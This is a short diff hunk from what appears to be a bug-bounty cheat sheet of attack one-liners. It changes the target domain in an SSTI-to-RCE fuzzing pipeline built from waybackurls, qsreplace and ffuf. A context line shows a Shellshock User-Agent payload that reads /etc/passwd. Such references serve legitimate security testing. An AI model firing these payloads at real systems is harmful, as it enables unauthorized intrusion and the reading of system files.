@@ -165,7 +165,7 @@ User-Agent: () { :;}; echo $(</etc/passwd)
 
 ## SSTI to RCE oneliner check
 ```sh
- waybackurls http://target.com | qsreplace "abc{{9*9}}" > fuzz.txt
+ waybackurls http://abc.com | qsreplace "abc{{9*9}}" > fuzz.txt
  ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
  ```
  ```sh
